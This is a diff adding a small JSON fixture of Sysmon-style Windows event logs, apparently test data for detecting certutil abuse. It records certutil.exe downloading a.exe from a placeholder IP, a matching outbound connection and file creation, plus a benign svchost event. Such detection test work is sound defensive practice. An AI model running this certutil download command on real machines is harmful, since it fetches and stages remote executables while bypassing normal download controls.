@@ -1,0 +1,6 @@
+[
+  {"EventID":1,"ProcessId":"4242","Image":"C:\\Windows\\System32\\certutil.exe","CommandLine":"certutil.exe -urlcache -f http://192.0.2.10/a.exe a.exe"},
+  {"EventID":3,"ProcessId":"4242","Image":"C:\\Windows\\System32\\certutil.exe","DestinationIp":"192.0.2.10","DestinationPort":"443"},
+  {"EventID":11,"ProcessId":"4242","Image":"C:\\Windows\\System32\\certutil.exe","TargetFilename":"C:\\Users\\analyst\\a.exe"},
+  {"EventID":3,"ProcessId":"9999","Image":"C:\\Windows\\System32\\svchost.exe","DestinationIp":"10.0.0.1","DestinationPort":"80"}
+]
